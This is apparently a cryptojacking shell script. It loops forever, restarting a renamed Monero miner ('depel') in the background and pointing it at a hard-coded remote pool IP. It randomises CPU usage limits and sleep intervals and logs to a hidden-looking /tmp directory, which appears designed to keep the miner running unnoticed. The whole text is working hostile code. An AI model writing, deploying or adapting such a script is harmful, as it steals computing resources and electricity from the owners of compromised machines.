#!/bin/sh

echo "Start"
while (true) 
do
 CPU=$(( 55 + $(date +%N) % 35 ))
 TIM=$(( 180 + $(date +%N) % 130 ))
 pkill depel
 depel -o 185.251.39.208:34332 --rig-id=$ID -B -l /tmp/beauty/depel.log --donate-level=1 --print-time=40 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=$CPU --av=1
 echo -e 'ALL WORKS! tail -f /tmp/beauty/depel.log' $CPU $TIM
 sleep $TIM;
done;
